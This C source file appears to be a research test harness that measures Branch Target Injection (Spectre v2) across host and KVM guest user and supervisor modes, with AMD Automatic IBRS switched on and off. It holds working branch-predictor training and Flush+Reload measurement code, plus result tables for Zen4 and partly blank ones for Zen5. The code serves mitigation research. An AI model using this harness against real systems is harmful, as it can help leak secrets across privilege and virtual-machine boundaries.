/*
 * Automatic IBRS BTI on Guest
 *
 * That is the impact of Automatic IBRS on BTI considering the guest? Is is still possible?
 *
 * As the attack vector we consider all combinations of HU, HS, GS, but as of now, no GU.
 *
 * We test the mentioned attack vectos, toggle autoIBRS to see its impact. The results of this experiment are summarized in this table:
 *
 * ## For Zen4
 *
 * ### For jmp:
 *
 *          |      HU     |      HS     |      GU     |      GS     |
 * autoIBRS |   no ! yes  |   no ! yes  |   no ! yes  |   no ! yes  |
 * -------- | ----------- | ----------- | ----------- | ----------- |
 *       HU | 1.00 ! 1.00 | 1.00 ! 0.00 | 1.00 ! 1.00 | 1.00 ! 0.00 |
 *       HS | 1.00 ! 1.00 | 1.00 ! 0.00 | 1.00 ! 1.00 | 1.00 ! 0.00 |
 *       GU | 1.00 ! 1.00 | 1.00 ! 0.00 | 1.00 ! 1.00 | 1.00 ! 0.00 |
 *       GS | 1.00 ! 1.00 | 1.00 ! 0.00 | 1.00 ! 1.00 | 1.00 ! 0.00 |
 *
 * autoIBRS has an impact for all attack vectors that try to inject into Supervisor. There is no difference between guest and user.
 *
 * ### For call:
 *
 *          |      HU     |      HS     |      GU     |      GS     |
 * autoIBRS |   no ! yes  |   no ! yes  |   no ! yes  |   no ! yes  |
 * -------- | ----------- | ----------- | ----------- | ----------- |
 *       HU | 1.00 ! 1.00 | 1.00 ! 0.00 | 1.00 ! 1.00 | 1.00 ! 0.00 |
 *       HS | 1.00 ! 1.00 | 1.00 ! 0.00 | 1.00 ! 1.00 | 1.00 ! 0.00 |
 *       GU | 1.00 ! 1.00 | 1.00 ! 0.00 | 1.00 ! 1.00 | 1.00 ! 0.00 |
 *       GS | 1.00 ! 1.00 | 1.00 ! 0.00 | 1.00 ! 1.00 | 1.00 ! 0.00 |
 *
 * Same as for jmp
 *
 *
 * ## For Zen5
 *
 * ### For jmp:
 *
 *          |      HU     |      HS     |      GU     |      GS     |
 * autoIBRS |   no ! yes  |   no ! yes  |   no ! yes  |   no ! yes  |
 * -------- | ----------- | ----------- | ----------- | ----------- |
 *       HU | 1.00 ! 1.00 |             | XXXX ! XXXX |             |
 *       HS |             |             | XXXX ! XXXX |             |
 *       GU | XXXX ! XXXX | XXXX ! XXXX | XXXX ! XXXX | XXXX ! XXXX |
 *       GS |             |             | XXXX ! XXXX |             |
 *
 * autoIBRS has an impact for HU -> HS and HS -> HS. Interesting is that we get a signal for GS -> HU and GS -> HS.
 *
 * ### For call:
 *
 *          |      HU     |      HS     |      GU     |      GS     |
 * autoIBRS |   no ! yes  |   no ! yes  |   no ! yes  |   no ! yes  |
 * -------- | ----------- | ----------- | ----------- | ----------- |
 *       HU |             |             | XXXX ! XXXX |             |
 *       HS |             |             | XXXX ! XXXX |             |
 *       GU | XXXX ! XXXX | XXXX ! XXXX | XXXX ! XXXX | XXXX ! XXXX |
 *       GS |             |             | XXXX ! XXXX |             |
 */

#include <ucall_common.h>
#include "processor.h"

#include "uarf/flush_reload.h"
#include "uarf/jita.h"
#include "uarf/kmod/pi.h"
#include "uarf/kmod/rap.h"
#include "uarf/lib.h"
#include "uarf/log.h"
#include "uarf/spec_lib.h"
#include "uarf/test.h"
#include "uarf/guest.h"

// TODO: should be defined in uarf/guest.h, but somehow compiler complains
#define uarf_guest_set_rip(vcpu, target)          \
	({                                        \
		struct kvm_regs regs;             \
		vcpu_regs_get(vcpu, &regs);       \
		regs.rip = (unsigned long)target; \
		vcpu_regs_set(vcpu, &regs);       \
	})

#ifdef UARF_LOG_TAG
#undef UARF_LOG_TAG
#define UARF_LOG_TAG UARF_LOG_TAG_TEST
#endif

#define CREATE_TCD(t_mode, s_mode, a_ibrs, main_jita)                   \
	(struct TestCaseData)                                           \
	{                                                               \
		.seed = seed++, .num_cands = 100, .num_rounds = 10,     \
		.num_train_rounds = 1, .jita_main = &main_jita,         \
		.jita_gadget = &jita_gadget, .jita_dummy = &jita_dummy, \
		.match_history = true, .train_mode = t_mode,            \
		.signal_mode = s_mode, .auto_ibrs = a_ibrs,             \
	}

uarf_psnip_declare(history, psnip_history);
uarf_psnip_declare(src_call_ind_no_ret, psnip_src_call_ind);
uarf_psnip_declare(src_jmp_ind_no_ret, psnip_src_jmp_ind);
uarf_psnip_declare(dst_gadget, psnip_dst_gadget);
uarf_psnip_declare(dst_dummy, psnip_dst_dummy);

uarf_psnip_declare(exp_guest_bti_jmp, psnip_jmp);

uarf_psnip_declare_define(psnip_ret, "ret\n\t");

enum mode {
	HOST_USER,
	HOST_SUPERVISOR,
	GUEST_USER,
	GUEST_SUPERVISOR,
};

const char *MODE_STR[4] = {
	"HOST_USER",
	"HOST_SUPERVISOR",
	"GUEST_USER",
	"GUEST_SUPERVISOR",
};

struct TestCaseData {
	uint32_t seed;
	uint32_t num_cands;
	uint32_t num_rounds;
	uint32_t num_train_rounds;
	UarfJitaCtxt *jita_main;
	UarfJitaCtxt *jita_gadget;
	UarfJitaCtxt *jita_dummy;
	bool match_history;
	enum mode train_mode;
	enum mode signal_mode;
	bool auto_ibrs;
};

struct GuestData {
	UarfSpecData spec_data;
};

// Out globals that we also need in our guest
struct GuestData guest_data;

UarfStub stub_main;
UarfStub stub_gadget;
UarfStub stub_dummy;

/*
 * In contrast to uarf_run_spec this function gets the spec data from a global. This is required for running inside guest. But we can also use this for running on the host.
 */
static void run_spec_global(void)
{
	UarfSpecData *data = &guest_data.spec_data;

	// Ensure we have access to the required data
	// It easier to debug if we fail here that later
	// Also prevents page faults, that would hinder the signal
	*(volatile uint64_t *)data->spec_prim_p;
	*(volatile uint64_t *)(_ul(data->spec_prim_p) + PAGE_SIZE);
	**(volatile uint64_t **)data->spec_dst_p_p;
	volatile uint64_t *secret_p =
		&((uint64_t *)data->fr_buf_p)[data->secret];
	*secret_p;

	*(volatile uint64_t *)stub_main.addr;
	*(volatile uint64_t *)stub_gadget.addr;
	*(volatile uint64_t *)stub_dummy.addr;

	uarf_mfence();
	uarf_lfence();

	// We touched the FR Buffer, so we need to flush again
	uarf_clflush(secret_p);

	asm volatile("lea return_here%=, %%rax\n\t"
		     "pushq %%rax\n\t"
		     "jmp *%0\n\t"
		     "return_here%=:\n\t" ::"r"(data->spec_prim_p),
		     "c"(data)
		     : "rax", "rdx", "rdi", "rsi", "r8", "memory");
}

/*
 * Entry point into run guest supervisor
 */
static void guest_supervisor_entry(void)
{
	run_spec_global();
	GUEST_DONE();
}

/*
 * Entry point into run guest user
 */
static void guest_user_entry(void)
{
	uarf_init_syscall(uarf_syscall_handler_return, __KERNEL_CS,
			  __USER_CS_STAR);

	uarf_supervisor2user(__USER_DS, __USER_CS);
	run_spec_global();

	// Return back to supervisor, such that we do no get troubles when recycling the VM
	uarf_user2supervisor();

	GUEST_DONE();
}

// TODO: Move to helper
void map_mem_to_guest(struct kvm_vm *vm, uint64_t va, uint64_t size)
{
	UARF_LOG_TRACE("(vm: %p, va: 0x%lx, size: %lu)\n", vm, va, size);
	static uint64_t next_slot = NR_MEM_REGIONS;
	static uint64_t used_pages = 0;

	uint64_t va_aligned = ALIGN_DOWN(va, PAGE_SIZE);
	UARF_LOG_DEBUG("Aligned 0x%lx to 0x%lx\n", va, va_aligned);

	uint64_t num_pages_to_map = DIV_ROUND_UP(size, PAGE_SIZE);
	uint64_t gpa =
		(vm->max_gfn - used_pages - num_pages_to_map) * PAGE_SIZE;

	UARF_LOG_DEBUG(
		"Add %lu pages (required: %lu B) of physical memory to guest at gpa 0x%lx (slot %lu)\n",
		num_pages_to_map, size, gpa, next_slot);
	vm_userspace_mem_region_add(vm, DEFAULT_VM_MEM_SRC, gpa, next_slot,
				    num_pages_to_map, 0);

	UARF_LOG_DEBUG("Add mapping in guest for gpa 0x%lx to gva 0x%lx\n", gpa,
		       va_aligned);
	virt_map(vm, va_aligned, gpa, num_pages_to_map);
	used_pages += num_pages_to_map;
	next_slot++;

	uint64_t *addr = addr_gpa2hva(vm, (vm_paddr_t)gpa);
	UARF_LOG_DEBUG("Copy %lu bytes from 0x%lx to 0x%lx\n", size, va,
		       _ul(addr));
	memcpy(addr, _ptr(va), size);
}

// TODO: Move to helper
void map_stub_to_guest(struct kvm_vm *vm, UarfStub *stub)
{
	UARF_LOG_TRACE("(vm: %p, stub: %p)\n", vm, stub);
	map_mem_to_guest(vm, stub->base_addr, stub->size);
}

// TODO: Move to helper
static void uarf_guest_run(struct kvm_vcpu *vcpu)
{
	struct ucall uc;

	while (true) {
		vcpu_run(vcpu);

		switch (get_ucall(vcpu, &uc)) {
		case UCALL_SYNC:
			printf("Got sync signal\n");
			printf("With %lu arguments\n", uc.args[1]);
			break;
		case UCALL_DONE:
			// printf("Got done signal\n");
			return;
		case UCALL_ABORT:
			printf("Got abort signal\n");
			REPORT_GUEST_ASSERT(uc);
			break;
		case UCALL_PRINTF:
			printf("guest | %s", uc.buffer);
			break;
		case UCALL_NONE:
			printf("Received none, of type: ");
			switch (vcpu->run->exit_reason) {
			case KVM_EXIT_SHUTDOWN:
				printf("Shutdown\n");
				printf("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n");
				printf("Most likely something went wrong. VM quit\n");
				printf("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n");
				return;
			default:
				printf("%s\nContinue\n",
				       exit_reason_str(vcpu->run->exit_reason));
				break;
			}
			break;
		default:
			TEST_ASSERT(false, "Unexpected exit: %s",
				    exit_reason_str(vcpu->run->exit_reason));
		}
	}
}

static inline void run_spec_host(UarfSpecData *sd, UarfFrConfig *fr)
{
	guest_data.spec_data = *sd;
	run_spec_global();
}

static void run_spec_guest(UarfSpecData *sd, UarfFrConfig *fr)
{
	struct kvm_vcpu *vcpu;
	struct kvm_vm *vm;

	uint64_t extra_pages = 10 * (3 + 512);

	guest_data.spec_data = *sd;

	// Create VM
	vm = __vm_create_with_one_vcpu(&vcpu, extra_pages,
				       guest_supervisor_entry);

	// Sync globals
	sync_global_to_guest(vm, guest_data);
	sync_global_to_guest(vm, stub_main);
	sync_global_to_guest(vm, stub_gadget);
	sync_global_to_guest(vm, stub_dummy);

	// Map stubs
	map_stub_to_guest(vm, &stub_main);
	map_stub_to_guest(vm, &stub_gadget);
	map_stub_to_guest(vm, &stub_dummy);

	// Map other memory
	map_mem_to_guest(vm, fr->buf.base_addr, fr->buf_size);
	map_mem_to_guest(vm, fr->buf2.base_addr, fr->buf_size);
	map_mem_to_guest(vm, fr->res_addr, fr->res_size);

	// Run VM
	uarf_guest_run(vcpu);

	// Trash VM (TODO: recycle VM somehow)
	kvm_vm_free(vm);
}

UARF_TEST_CASE_ARG(basic, arg)
{
	struct TestCaseData *data = (struct TestCaseData *)arg;
	srand(data->seed);

	UARF_LOG_INFO("%s -> %s, autoIBRS %s\n", MODE_STR[data->train_mode],
		      MODE_STR[data->signal_mode],
		      data->auto_ibrs ? "yes" : "no");

	uint64_t extra_pages = 10 * (3 + 512);

	UarfFrConfig fr = uarf_fr_init(8, 6, (size_t[]){ 0, 1, 2, 3, 5, 10 });
	// struct FrConfig fr = fr_init(8, 1, NULL);

	stub_main = uarf_stub_init();
	stub_gadget = uarf_stub_init();
	stub_dummy = uarf_stub_init();

	uarf_ibpb();

	if (data->auto_ibrs) {
		uarf_auto_ibrs_on();
	} else {
		uarf_auto_ibrs_off();
	}

	uarf_fr_reset(&fr);

	for (size_t c = 0; c < data->num_cands; c++) {
		uarf_jita_allocate(data->jita_main, &stub_main, uarf_rand47());
		uarf_jita_allocate(data->jita_gadget, &stub_gadget,
				   uarf_rand47());
		uarf_jita_allocate(data->jita_dummy, &stub_dummy,
				   uarf_rand47());

		UarfHistory h1 = uarf_get_randomized_history();

		UarfHistory h2 = data->match_history ?
					 h1 :
					 uarf_get_randomized_history();

		UarfSpecData train_data = {
			.spec_prim_p = stub_main.addr,
			.spec_dst_p_p = _ul(&stub_gadget.addr),
			.fr_buf_p = fr.buf2.addr,
			.secret = 0,
			.hist = h1,
		};

		UarfSpecData signal_data = {
			.spec_prim_p = stub_main.addr,
			.spec_dst_p_p = _ul(&stub_dummy.addr),
			// .spec_dst_p_p = _ul(&stub_gadget.addr),
			.fr_buf_p = fr.buf.addr,
			.secret = 0,
			.hist = h2,
		};

		struct kvm_vcpu *vcpu = NULL;
		struct kvm_vm *vm = NULL;
		if (data->train_mode == GUEST_USER ||
		    data->train_mode == GUEST_SUPERVISOR ||
		    data->signal_mode == GUEST_USER ||
		    data->signal_mode == GUEST_SUPERVISOR) {
			// Target does not matter yet, as we reset it anyways
			vm = __vm_create_with_one_vcpu(&vcpu, extra_pages,
						       guest_user_entry);

			// Sync globals
			sync_global_to_guest(vm, guest_data);
			sync_global_to_guest(vm, stub_main);
			sync_global_to_guest(vm, stub_gadget);
			sync_global_to_guest(vm, stub_dummy);

			// Map stubs
			map_stub_to_guest(vm, &stub_main);
			map_stub_to_guest(vm, &stub_gadget);
			map_stub_to_guest(vm, &stub_dummy);

			// Map other memory
			map_mem_to_guest(vm, fr.buf.base_addr, fr.buf_size);
			map_mem_to_guest(vm, fr.buf2.base_addr, fr.buf_size);
			map_mem_to_guest(vm, fr.res_addr, fr.res_size);
		}

		for (size_t r = 0; r < data->num_rounds; r++) {
			for (size_t t = 0; t < data->num_train_rounds; t++) {
				switch (data->train_mode) {
				case HOST_USER:
					guest_data.spec_data = train_data;
					run_spec_global();
					break;
				case HOST_SUPERVISOR:
					// Ensure the required data is paged, as when executing in supervisor mode we
					// cannot handle pagefaults => error
					*(volatile char *)uarf_run_spec;
					*(volatile char *)train_data.spec_prim_p;
					**(volatile char **)
						  train_data.spec_dst_p_p;
					*(volatile char *)train_data.fr_buf_p;
					*(volatile char *)
						 signal_data.spec_prim_p;
					**(volatile char **)
						  signal_data.spec_dst_p_p;
					*(volatile char *)signal_data.fr_buf_p;

					uarf_rap_call(uarf_run_spec,
						      &train_data);
					break;
				case GUEST_USER:
					guest_data.spec_data = train_data;
					sync_global_to_guest(vm, guest_data);

					uarf_guest_set_rip(vcpu,
							   guest_user_entry);
					uarf_guest_run(vcpu);

					break;
				case GUEST_SUPERVISOR:
					guest_data.spec_data = train_data;
					sync_global_to_guest(vm, guest_data);

					uarf_guest_set_rip(
						vcpu, guest_supervisor_entry);
					uarf_guest_run(vcpu);
					break;
				}
			}

			switch (data->signal_mode) {
			case HOST_USER:
				uarf_fr_flush(&fr);
				guest_data.spec_data = signal_data;
				run_spec_global();
				signal_data = guest_data.spec_data;
				uarf_fr_reload_binned(&fr, r);
				break;
			case HOST_SUPERVISOR:
				// Ensure the required data is paged, as when executing in supervisor mode we
				// cannot handle pagefaults => error
				*(volatile char *)uarf_run_spec;
				*(volatile char *)train_data.spec_prim_p;
				**(volatile char **)train_data.spec_dst_p_p;
				*(volatile char *)train_data.fr_buf_p;
				*(volatile char *)signal_data.spec_prim_p;
				**(volatile char **)signal_data.spec_dst_p_p;
				*(volatile char *)signal_data.fr_buf_p;

				uarf_fr_flush(&fr);
				uarf_rap_call(uarf_run_spec, &signal_data);
				uarf_fr_reload_binned(&fr, r);
				break;
			case GUEST_USER:
				guest_data.spec_data = signal_data;
				sync_global_to_guest(vm, guest_data);

				fr.buf.handle_p = addr_gva2hva(vm, fr.buf.addr);
				uarf_fr_flush(&fr);

				uarf_guest_set_rip(vcpu, guest_user_entry);
				uarf_guest_run(vcpu);

				sync_global_from_guest(vm, guest_data);
				uarf_fr_reload_binned(&fr, r);
				break;
			case GUEST_SUPERVISOR:
				guest_data.spec_data = signal_data;
				sync_global_to_guest(vm, guest_data);

				fr.buf.handle_p = addr_gva2hva(vm, fr.buf.addr);
				uarf_fr_flush(&fr);

				uarf_guest_set_rip(vcpu,
						   guest_supervisor_entry);
				uarf_guest_run(vcpu);

				sync_global_from_guest(vm, guest_data);
				uarf_fr_reload_binned(&fr, r);
				break;
			}
		}

		if (vm) {
			kvm_vm_free(vm);
		}
		// if (vm_signal) {
		// 	kvm_vm_free(vm_signal);
		// }

		uarf_jita_deallocate(data->jita_main, &stub_main);
		uarf_jita_deallocate(data->jita_gadget, &stub_gadget);
		uarf_jita_deallocate(data->jita_dummy, &stub_dummy);
	}

	uarf_fr_print(&fr);

	uarf_fr_deinit(&fr);

	UARF_TEST_PASS();
}

static struct TestCaseData data[32];

UARF_TEST_SUITE()
{
	uarf_log_system_level = UARF_LOG_LEVEL_INFO;

	uint32_t seed = uarf_get_seed();
	UARF_LOG_INFO("Using seed: %u\n", seed);
	uarf_pi_init();
	uarf_rap_init();

	UarfJitaCtxt jita_main_call = uarf_jita_init();
	UarfJitaCtxt jita_main_jmp = uarf_jita_init();
	UarfJitaCtxt jita_gadget = uarf_jita_init();
	UarfJitaCtxt jita_dummy = uarf_jita_init();

	uarf_jita_push_psnip(&jita_main_call, &psnip_history);
	uarf_jita_push_psnip(&jita_main_call, &psnip_history);
	uarf_jita_push_psnip(&jita_main_call, &psnip_history);
	uarf_jita_push_psnip(&jita_main_call, &psnip_history);
	uarf_jita_push_psnip(&jita_main_call, &psnip_history);

	uarf_jita_clone(&jita_main_call, &jita_main_jmp);

	uarf_jita_push_psnip(&jita_main_call, &psnip_src_call_ind);
	uarf_jita_push_psnip(&jita_main_call, &psnip_src_call_ind);

	uarf_jita_push_psnip(&jita_main_jmp, &psnip_src_jmp_ind);
	uarf_jita_push_psnip(&jita_main_jmp, &psnip_src_jmp_ind);

	uarf_jita_push_psnip(&jita_main_call, &psnip_ret);
	uarf_jita_push_psnip(&jita_main_jmp, &psnip_ret);

	uarf_jita_push_psnip(&jita_gadget, &psnip_dst_gadget);
	uarf_jita_push_psnip(&jita_dummy, &psnip_dst_dummy);

	size_t data_i = 0;

	// for (size_t train_mode = 0; train_mode < 4; train_mode++) {
	// 	for (size_t signal_mode = 0; signal_mode < 4; signal_mode++) {
	// 		if (train_mode == GUEST_USER ||
	// 		    signal_mode == GUEST_USER) {
	// 			continue;
	// 		}
	//
	// 		data[data_i++] = (struct TestCaseData){
	// 			.seed = seed++,
	// 			.num_cands = 100,
	// 			.num_rounds = 10,
	// 			.num_train_rounds = 1,
	// 			.jita_main = &jita_main_jmp,
	// 			.jita_gadget = &jita_gadget,
	// 			.jita_dummy = &jita_dummy,
	// 			.match_history = true,
	// 			.train_mode = train_mode,
	// 			.signal_mode = signal_mode,
	// 			.auto_ibrs = false,
	// 		};
	//
	// 		data[data_i++] = (struct TestCaseData){
	// 			.seed = seed++,
	// 			.num_cands = 100,
	// 			.num_rounds = 10,
	// 			.num_train_rounds = 1,
	// 			.jita_main = &jita_main_jmp,
	// 			.jita_gadget = &jita_gadget,
	// 			.jita_dummy = &jita_dummy,
	// 			.match_history = true,
	// 			.train_mode = train_mode,
	// 			.signal_mode = signal_mode,
	// 			.auto_ibrs = true,
	// 		};
	// 	}
	// }

	// data[data_i++] = (struct TestCaseData){
	// 	.seed = seed++,
	// 	.num_cands = 50,
	// 	.num_rounds = 5,
	// 	.num_train_rounds = 1,
	// 	.jita_main = &jita_main_jmp,
	// 	.jita_gadget = &jita_gadget,
	// 	.jita_dummy = &jita_dummy,
	// 	.match_history = true,
	// 	.train_mode = HOST_USER,
	// 	.signal_mode = HOST_USER,
	// 	.auto_ibrs = false,
	// };

	// clang-format off
	data[data_i++] = CREATE_TCD(HOST_USER, HOST_USER, false, jita_main_jmp);
	data[data_i++] = CREATE_TCD(HOST_USER, HOST_USER, true, jita_main_jmp);

	data[data_i++] = CREATE_TCD(HOST_USER, HOST_SUPERVISOR, false, jita_main_jmp);
	data[data_i++] = CREATE_TCD(HOST_USER, HOST_SUPERVISOR, true, jita_main_jmp);

	data[data_i++] = CREATE_TCD(HOST_USER, GUEST_USER, false, jita_main_jmp);
	data[data_i++] = CREATE_TCD(HOST_USER, GUEST_USER, true, jita_main_jmp);

	data[data_i++] = CREATE_TCD(HOST_USER, GUEST_SUPERVISOR, false, jita_main_jmp);
	data[data_i++] = CREATE_TCD(HOST_USER, GUEST_SUPERVISOR, true, jita_main_jmp);

	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, HOST_USER, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, HOST_USER, true, jita_main_jmp);
	//
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, HOST_SUPERVISOR, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, HOST_SUPERVISOR, true, jita_main_jmp);
	//
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, GUEST_USER, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, GUEST_USER, true, jita_main_jmp);
	//
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, GUEST_SUPERVISOR, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, GUEST_SUPERVISOR, true, jita_main_jmp);

	// data[data_i++] = CREATE_TCD(GUEST_USER, HOST_USER, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(GUEST_USER, HOST_USER, true, jita_main_jmp);
	//
	// data[data_i++] = CREATE_TCD(GUEST_USER, HOST_SUPERVISOR, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(GUEST_USER, HOST_SUPERVISOR, true, jita_main_jmp);
	//
	// data[data_i++] = CREATE_TCD(GUEST_USER, GUEST_USER, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(GUEST_USER, GUEST_USER, true, jita_main_jmp);
	//
	// data[data_i++] = CREATE_TCD(GUEST_USER, GUEST_SUPERVISOR, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(GUEST_USER, GUEST_SUPERVISOR, true, jita_main_jmp);

	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, HOST_USER, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, HOST_USER, true, jita_main_jmp);
	//
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, HOST_SUPERVISOR, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, HOST_SUPERVISOR, true, jita_main_jmp);
	//
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, GUEST_USER, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, GUEST_USER, true, jita_main_jmp);
	//
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, GUEST_SUPERVISOR, false, jita_main_jmp);
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, GUEST_SUPERVISOR, true, jita_main_jmp);


	// data[data_i++] = CREATE_TCD(HOST_USER, HOST_USER, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(HOST_USER, HOST_USER, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(HOST_USER, HOST_SUPERVISOR, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(HOST_USER, HOST_SUPERVISOR, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(HOST_USER, GUEST_USER, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(HOST_USER, GUEST_USER, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(HOST_USER, GUEST_SUPERVISOR, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(HOST_USER, GUEST_SUPERVISOR, true, jita_main_call);

	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, HOST_USER, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, HOST_USER, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, HOST_SUPERVISOR, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, HOST_SUPERVISOR, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, GUEST_USER, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, GUEST_USER, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, GUEST_SUPERVISOR, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(HOST_SUPERVISOR, GUEST_SUPERVISOR, true, jita_main_call);

	// data[data_i++] = CREATE_TCD(GUEST_USER, HOST_USER, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(GUEST_USER, HOST_USER, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(GUEST_USER, HOST_SUPERVISOR, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(GUEST_USER, HOST_SUPERVISOR, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(GUEST_USER, GUEST_USER, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(GUEST_USER, GUEST_USER, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(GUEST_USER, GUEST_SUPERVISOR, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(GUEST_USER, GUEST_SUPERVISOR, true, jita_main_call);

	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, HOST_USER, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, HOST_USER, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, HOST_SUPERVISOR, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, HOST_SUPERVISOR, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, GUEST_USER, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, GUEST_USER, true, jita_main_call);
	//
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, GUEST_SUPERVISOR, false, jita_main_call);
	// data[data_i++] = CREATE_TCD(GUEST_SUPERVISOR, GUEST_SUPERVISOR, true, jita_main_call);
	// clang-format on

	for (size_t i = 0; i < data_i; i++) {
		UARF_TEST_RUN_CASE_ARG(basic, data + i);
	}

	uarf_pi_deinit();
	uarf_rap_deinit();

	return 0;
}
